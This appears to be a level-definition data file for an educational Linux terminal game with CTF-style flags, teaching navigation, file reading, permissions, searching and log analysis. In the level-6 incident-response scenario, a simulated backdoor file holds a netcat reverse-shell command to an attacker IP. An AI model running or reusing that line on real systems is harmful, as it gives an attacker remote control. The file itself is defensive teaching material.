// src/data/levels.js
//
// NOTE: The `flag` field below is a placeholder. Actual flags are
// auto-generated at game-start by src/utils/flagGenerator.js and injected
// into each level's fileSystem at the level's `flagFile` path.

// Per-level time limits in seconds
export const LEVEL_TIME_LIMITS = {
  1: 80, 2: 120, 3: 150, 4: 180, 5: 200, 6: 240, 7: 300,
};

export const LEVELS = [
  {
    id: 1,
    title: "Basic Navigation",
    subtitle: "Find Your Way",
    concepts: ["pwd", "ls", "cd"],
    allowedCommands: ["pwd", "ls", "cd", "submit", "help", "hint", "clear", "history"],
    timeLimitSecs: LEVEL_TIME_LIMITS[1],
    flag: "flag{placeholder}",
    flagFile: "/home/hacker/secrets/flag.txt",
    flagInjection: "replace",
    flagDir: "/home/hacker/secrets",
    hint: "Use 'ls' to list what's in a directory, then 'cd <dirname>' to enter it. The flag is somewhere in /home/hacker/secrets/",
    mission: "Navigate the file system to find flag.txt. Use pwd to know where you are, ls to list contents, and cd to move around. Once you see flag.txt in a listing, type 'submit' to capture it.",
    pointsAvailable: 60,
    studyTopics: [
      { topic: "pwd", note: "Prints your current directory. Run it any time you're lost." },
      { topic: "ls",  note: "Lists files and folders in the current directory." },
      { topic: "cd",  note: "Changes directory. Use 'cd <name>' to enter, 'cd ..' to go up." },
      { topic: "Relative vs absolute paths", note: "'secrets' (relative) vs '/home/hacker/secrets' (absolute)." },
    ],
    fileSystem: {
      "/home/hacker":           { type: "dir", children: ["documents", "downloads", "secrets"] },
      "/home/hacker/documents": { type: "dir", children: ["notes.txt"] },
      "/home/hacker/documents/notes.txt": {
        type: "file",
        content: "Welcome to Terminalized!\nThis is your first mission.\nNavigate to the secrets directory to find what you're looking for.\n\nTip: Use 'ls' to list files and 'cd' to change directories.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/downloads":   { type: "dir", children: [] },
      "/home/hacker/secrets":     { type: "dir", children: ["flag.txt"] },
      "/home/hacker/secrets/flag.txt": {
        type: "file", content: "flag{placeholder}",
        hidden: false, permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 2,
    title: "Reading Files",
    subtitle: "The Reader's Den",
    concepts: ["cat", "less", "head", "tail"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[2],
    flag: "flag{placeholder}",
    flagFile: "/home/hacker/backup/hidden.txt",
    flagInjection: "replace",
    hint: "Read the log file in the logs/ directory. There's a clue inside pointing to where the flag is stored.",
    mission: "A clue is buried in the system logs. Read the log file to discover where the secret flag has been hidden, then navigate there and read it with cat.",
    pointsAvailable: 80,
    studyTopics: [
      { topic: "cat",  note: "Reads and prints the contents of a file." },
      { topic: "head", note: "Shows the first 10 lines of a file (or first N with -n)." },
      { topic: "tail", note: "Shows the last 10 lines of a file. Useful for log inspection." },
      { topic: "less / more", note: "Pager commands for reading long files page by page." },
      { topic: "Following clues", note: "Read logs carefully — they often hint at file paths." },
    ],
    fileSystem: {
      "/home/hacker": { type: "dir", children: ["logs", "backup", "readme.txt"] },
      "/home/hacker/readme.txt": {
        type: "file",
        content: "SYSTEM NOTICE\n=============\nCheck the logs directory for recent system activity.\nSomething interesting may have been recorded.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/logs": { type: "dir", children: ["system.log", "access.log"] },
      "/home/hacker/logs/system.log": {
        type: "file",
        content: "[INFO]  System boot sequence initiated\n[INFO]  User 'hacker' logged in at 09:42:11\n[WARN]  Unusual file access detected\n[INFO]  User stored secret in /backup/hidden.txt\n[INFO]  File transfer complete\n[DEBUG] Process 1337 terminated",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/logs/access.log": {
        type: "file",
        content: "GET /home/hacker - 200 OK\nGET /home/hacker/logs - 200 OK\nPOST /secret_upload - 403 FORBIDDEN\nGET /backup - 200 OK",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/backup": { type: "dir", children: ["hidden.txt", "old_config.bak"] },
      "/home/hacker/backup/hidden.txt": {
        type: "file", content: "flag{placeholder}",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/backup/old_config.bak": {
        type: "file",
        content: "# Old Configuration Backup\nhost=localhost\nport=8080\nmax_connections=100\n# This file is no longer in use",
        hidden: false, permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 3,
    title: "Hidden Files",
    subtitle: "What Lies Beneath",
    concepts: ["ls -a"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[3],
    flag: "flag{placeholder}",
    flagFile: "/home/hacker/.secrets/flag.txt",
    flagInjection: "replace",
    hint: "Hidden files in Linux start with a dot (.). Use 'ls -a' to reveal ALL files, including hidden ones.",
    mission: "The flag is hidden from plain sight. Linux hides files that start with a dot. Use 'ls -a' to reveal all hidden files and directories, then cat the flag file you find.",
    pointsAvailable: 80,
    studyTopics: [
      { topic: "Hidden files (dotfiles)", note: "Files starting with a dot (e.g. .config) are hidden by default." },
      { topic: "ls -a", note: "Shows all files including hidden ones." },
      { topic: "ls -la", note: "Combines -l (long listing) and -a (all files)." },
      { topic: "Common dotfiles", note: ".bashrc, .ssh, .gitconfig — important configs live in dotfiles." },
    ],
    fileSystem: {
      "/home/hacker":          { type: "dir", children: ["public", "workspace", ".secrets", ".config"] },
      "/home/hacker/public":   { type: "dir", children: ["index.html", "decoy.txt"] },
      "/home/hacker/public/index.html": {
        type: "file", content: "<html>\n<body>\n<p>Nothing to see here. Keep looking.</p>\n</body>\n</html>",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/public/decoy.txt": {
        type: "file", content: "This is NOT the flag. Try harder.\nHint: some things are hidden from plain view.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/workspace": { type: "dir", children: ["project.txt"] },
      "/home/hacker/workspace/project.txt": {
        type: "file", content: "Project Notes\n=============\nRemember: always check for hidden files before concluding a directory is empty.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/.config": { type: "dir", hidden: true, children: ["settings.conf"] },
      "/home/hacker/.config/settings.conf": {
        type: "file", hidden: true,
        content: "# System Configuration\ntheme=dark\nversion=1.0\n# Not what you're looking for, but good practice finding hidden dirs!",
        permissions: "rw-r--r--",
      },
      "/home/hacker/.secrets": { type: "dir", hidden: true, children: ["flag.txt"] },
      "/home/hacker/.secrets/flag.txt": {
        type: "file", hidden: true, content: "flag{placeholder}", permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 4,
    title: "Permissions Challenge",
    subtitle: "Access Denied",
    concepts: ["chmod", "ls -l"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "chmod", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[4],
    flag: "flag{placeholder}",
    flagFile: "/home/hacker/secure/flag.txt",
    flagInjection: "replace",
    hint: "Use 'ls -l' to see file permissions. If a file shows '----------', use 'chmod 644 <filename>' to make it readable.",
    mission: "A flag file exists but you can't read it — permissions have been stripped. Use 'ls -l' to inspect permissions, then 'chmod' to fix them and cat the flag.",
    pointsAvailable: 100,
    studyTopics: [
      { topic: "File permissions", note: "Each file has owner/group/other read/write/execute bits." },
      { topic: "ls -l", note: "Long listing shows permissions (e.g. -rw-r--r--)." },
      { topic: "chmod", note: "Changes permissions. 644 = readable; 000 = no access." },
      { topic: "Octal notation", note: "4=read, 2=write, 1=execute. Sum for combos (e.g. 6=rw)." },
    ],
    fileSystem: {
      "/home/hacker": { type: "dir", children: ["secure", "docs", "readme.txt"] },
      "/home/hacker/readme.txt": {
        type: "file",
        content: "SECURITY NOTICE\n===============\nSomeone has locked down the flag file in the secure/ directory.\nYou'll need to fix the permissions to read it.\n\nUse 'ls -l' to inspect permissions and 'chmod' to change them.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/docs": { type: "dir", children: ["permissions_guide.txt"] },
      "/home/hacker/docs/permissions_guide.txt": {
        type: "file",
        content: "Linux Permissions Quick Reference\n==================================\nFormat: [type][owner][group][others]\nExample: -rw-r--r--\n\nCommon chmod values:\n  644  = owner read/write, others read-only\n  755  = owner all, others read/execute\n  000  = no permissions (locked!)\n  400  = owner read-only\n\nTo fix a locked file:\n  chmod 644 filename",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/secure": { type: "dir", children: ["flag.txt", "decoy.txt"] },
      "/home/hacker/secure/flag.txt": {
        type: "file", content: "flag{placeholder}",
        hidden: false, permissions: "----------", locked: true,
      },
      "/home/hacker/secure/decoy.txt": {
        type: "file", content: "Not the flag, but you found a readable file!\nThe real flag.txt needs its permissions fixed.",
        hidden: false, permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 5,
    title: "Searching Files",
    subtitle: "Search & Destroy",
    concepts: ["find", "grep"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "grep", "find", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[5],
    flag: "flag{placeholder}",
    flagFile: "/home/hacker/data/secret_data.txt",
    flagInjection: "placeholder",
    hint: "Use 'find . -name \"*secret*\"' to search by filename, or 'grep \"CLASSIFIED\" <filename>' to search inside files. Once you cat the secret_data.txt file, you'll see the flag.",
    mission: "The flag is buried among many files. Use 'find' to locate files by name pattern, then cat the suspicious one to reveal the flag.",
    pointsAvailable: 120,
    studyTopics: [
      { topic: "find", note: "Locates files in a directory tree. -name '*pattern*' filters by name." },
      { topic: "grep", note: "Searches inside files for text patterns. -r for recursive." },
      { topic: "Glob patterns", note: "* matches any sequence, ? matches one char." },
      { topic: "Piping", note: "Combine: find . -name '*.log' | xargs grep 'error'" },
    ],
    fileSystem: {
      "/home/hacker": { type: "dir", children: ["data", "logs", "archive"] },
      "/home/hacker/data": { type: "dir", children: ["file1.txt","file2.txt","file3.txt","secret_data.txt","file4.txt","file5.txt"] },
      "/home/hacker/data/file1.txt": { type: "file", content: "Lorem ipsum dolor sit amet.\nNot what you're looking for.", hidden: false, permissions: "rw-r--r--" },
      "/home/hacker/data/file2.txt": { type: "file", content: "System configuration data.\nVersion: 2.1.4\nStatus: Active", hidden: false, permissions: "rw-r--r--" },
      "/home/hacker/data/file3.txt": { type: "file", content: "Network scan results:\n192.168.1.1 - open\n192.168.1.2 - closed\nNothing suspicious here.", hidden: false, permissions: "rw-r--r--" },
      "/home/hacker/data/secret_data.txt": {
        type: "file",
        content: "CLASSIFIED DATA\n===============\nOperation: NIGHTFALL\nStatus: ACTIVE\nflag{placeholder}\nDestroy after reading.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/data/file4.txt": { type: "file", content: "User activity report.\nLogin: 08:00\nLogout: 17:30\nNo anomalies detected.", hidden: false, permissions: "rw-r--r--" },
      "/home/hacker/data/file5.txt": { type: "file", content: "Backup manifest:\n- config.bak\n- users.bak\n- logs.bak\nAll backups verified.", hidden: false, permissions: "rw-r--r--" },
      "/home/hacker/logs":    { type: "dir", children: ["app.log","error.log","debug.log"] },
      "/home/hacker/logs/app.log":   { type: "file", content: "[APP] Service started\n[APP] Request processed: 200 OK", hidden: false, permissions: "rw-r--r--" },
      "/home/hacker/logs/error.log": { type: "file", content: "[ERROR] Connection refused\n[ERROR] Timeout after 30s", hidden: false, permissions: "rw-r--r--" },
      "/home/hacker/logs/debug.log": { type: "file", content: "[DEBUG] Loading modules...\n[DEBUG] Config parsed", hidden: false, permissions: "rw-r--r--" },
      "/home/hacker/archive": { type: "dir", children: ["2023.tar.gz.txt","notes.txt"] },
      "/home/hacker/archive/2023.tar.gz.txt": { type: "file", content: "Archive index: 2023 data\nFiles: 1,442\nSize: 2.3GB\nStatus: Compressed", hidden: false, permissions: "rw-r--r--" },
      "/home/hacker/archive/notes.txt": { type: "file", content: "Old archive notes. Nothing important here.", hidden: false, permissions: "rw-r--r--" },
    },
  },

  {
    id: 6,
    title: "Log Analysis",
    subtitle: "Incident Response",
    concepts: ["grep", "tail"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "grep", "find", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[6],
    flag: "flag{placeholder}",
    flagFile: "/home/hacker/tmp/backdoor.sh",
    flagInjection: "placeholder",
    hint: "Use 'tail logs/auth.log' to see recent events, or 'grep \"attacker\" logs/auth.log' to filter for attacker activity. Then cat the file the attacker created.",
    mission: "A security incident has occurred. Investigate the logs to trace attacker activity, identify the compromised file in /tmp/, and cat it to retrieve the flag.",
    pointsAvailable: 130,
    studyTopics: [
      { topic: "Log analysis",        note: "Investigate auth.log and syslog for failed logins and suspicious activity." },
      { topic: "tail / tail -f",      note: "Show recent log entries; -f follows in real time." },
      { topic: "grep with logs",      note: "Filter logs: grep 'ERROR' /var/log/syslog" },
      { topic: "Incident response",   note: "Identify entry point → trace activity → find compromised artefacts." },
    ],
    fileSystem: {
      "/home/hacker": { type: "dir", children: ["logs", "tmp", "reports"] },
      "/home/hacker/logs": { type: "dir", children: ["auth.log","syslog","access.log"] },
      "/home/hacker/logs/auth.log": {
        type: "file",
        content: "[2024-01-15 02:11:00] Failed login attempt from attacker@192.168.99.1\n[2024-01-15 02:11:03] Failed login attempt from attacker@192.168.99.1\n[2024-01-15 02:11:07] Access granted to user: attacker@192.168.99.1\n[2024-01-15 02:11:09] Privilege escalation attempted\n[2024-01-15 02:11:12] File created: /tmp/backdoor.sh\n[2024-01-15 02:11:15] Access granted to /tmp/backdoor.sh\n[2024-01-15 02:11:20] Connection closed",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/logs/syslog": {
        type: "file",
        content: "[2024-01-15 02:10:55] Kernel: Network interface eth0 up\n[2024-01-15 02:11:00] sshd[1234]: Connection from 192.168.99.1\n[2024-01-15 02:11:12] bash[5678]: /tmp/backdoor.sh created\n[2024-01-15 02:11:18] cron: suspicious task added\n[2024-01-15 02:11:22] netstat: outbound connection 192.168.99.1:4444",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/logs/access.log": {
        type: "file",
        content: "192.168.1.5 - GET /index.html 200\n192.168.1.5 - GET /style.css 200\n192.168.99.1 - POST /admin/upload 403\n192.168.99.1 - GET /etc/passwd 403\n192.168.99.1 - GET /tmp/backdoor.sh 200",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/tmp": { type: "dir", children: ["backdoor.sh","legit_script.sh"] },
      "/home/hacker/tmp/backdoor.sh": {
        type: "file",
        content: "#!/bin/bash\n# Attacker backdoor — DO NOT EXECUTE\n# Planted by: attacker@192.168.99.1\n\nnc -e /bin/bash 192.168.99.1 4444 &\n\n# You found the compromised file!\nflag{placeholder}",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/tmp/legit_script.sh": {
        type: "file", content: "#!/bin/bash\n# Legitimate maintenance script\necho 'Running system cleanup...'\nfind /tmp -mtime +7 -delete\necho 'Done.'",
        hidden: false, permissions: "rwxr-xr-x",
      },
      "/home/hacker/reports": { type: "dir", children: ["template.txt"] },
      "/home/hacker/reports/template.txt": {
        type: "file",
        content: "INCIDENT REPORT TEMPLATE\n========================\nDate: \nAttacker IP: \nEntry Point: \nFiles Modified: \nRemediation Steps: \n\nTip: Fill this in after you've investigated the logs!",
        hidden: false, permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 7,
    title: "Final Boss",
    subtitle: "The Ultimate Challenge",
    concepts: ["all skills combined"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "chmod", "grep", "find", "echo", "whoami", "uname", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[7],
    flag: "flag{placeholder}",
    flagFile: "/home/hacker/.vault/classified/final_flag.txt",
    flagInjection: "replace",
    hint: "This level requires ALL your skills. Start with 'ls -a' to find hidden directories, use 'ls -l' to check permissions, then 'chmod' and 'cat' to reveal the final flag.",
    mission: "The ultimate challenge. Use every skill you've learned: find hidden directories, fix broken permissions, then cat the final flag to complete Terminalized.",
    pointsAvailable: 200,
    studyTopics: [
      { topic: "Combining commands",       note: "Real-world tasks chain multiple commands. Practice piping." },
      { topic: "Hidden directories",       note: "Always check for dotfiles in unfamiliar systems." },
      { topic: "Permission troubleshooting", note: "ls -la → chmod → cat is a common workflow." },
      { topic: "Systematic exploration",   note: "When stuck: pwd, ls -la, read every README." },
    ],
    fileSystem: {
      "/home/hacker": { type: "dir", children: ["mission_brief.txt","logs","workspace",".vault"] },
      "/home/hacker/mission_brief.txt": {
        type: "file",
        content: "FINAL MISSION BRIEF\n===================\nAgent, this is your ultimate test.\n\nStep 1: Find the hidden vault directory\nStep 2: Check what's inside (permissions may be an issue)\nStep 3: Investigate the logs for the access code\nStep 4: Use your skills to retrieve the final flag\n\nGood luck. You'll need it.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/logs": { type: "dir", children: ["mission.log","access.log"] },
      "/home/hacker/logs/mission.log": {
        type: "file",
        content: "[MISSION] Final objective loaded\n[MISSION] Hidden vault created at /home/hacker/.vault\n[MISSION] Flag stored in vault/classified/final_flag.txt\n[MISSION] Permissions locked on final_flag.txt\n[MISSION] Use chmod 644 to unlock\n[MISSION] Awaiting agent retrieval...",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/logs/access.log": {
        type: "file",
        content: "[ACCESS] Vault directory sealed\n[ACCESS] File: .vault/classified/final_flag.txt - permissions set to 000\n[ACCESS] Only authorised agents may unlock\n[ACCESS] cat after chmod to view contents",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/workspace": { type: "dir", children: ["tools.txt","cheatsheet.txt"] },
      "/home/hacker/workspace/tools.txt": {
        type: "file",
        content: "Available Tools for Final Mission\n==================================\nls -a   : reveal hidden files\nls -l   : show permissions\ncd      : navigate directories\ncat     : read file contents\nchmod   : change permissions\ngrep    : search file contents\nfind    : find files by name/pattern\n\nYou have everything you need. Trust your training.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/workspace/cheatsheet.txt": {
        type: "file",
        content: "QUICK REFERENCE\n===============\nchmod 644 file.txt    - make file readable\nls -la                - list all files with details\nfind . -name '*.txt'  - find all .txt files\ngrep 'flag' file.txt  - search for 'flag' in file\ncat file.txt          - display file contents",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/hacker/.vault": { type: "dir", hidden: true, children: ["classified"] },
      "/home/hacker/.vault/classified": { type: "dir", hidden: true, children: ["final_flag.txt","intel.txt"] },
      "/home/hacker/.vault/classified/intel.txt": {
        type: "file", hidden: true,
        content: "CLASSIFIED INTEL\n================\nYou've made it this far. The final flag is right here.\nBut first — unlock it with chmod 644 final_flag.txt\nThen cat it to claim your victory.",
        permissions: "rw-r--r--",
      },
      "/home/hacker/.vault/classified/final_flag.txt": {
        type: "file", hidden: true, content: "flag{placeholder}",
        permissions: "----------", locked: true,
      },
    },
  },
];

export const SCORING = {
  correctCommand: 5,
  findClue: 10,
  findFlag: 50,
  completeLevel: 100,
  wrongCommand: -2,
  hintUsage: -10,
  timeExpiredPenalty: 0,
};
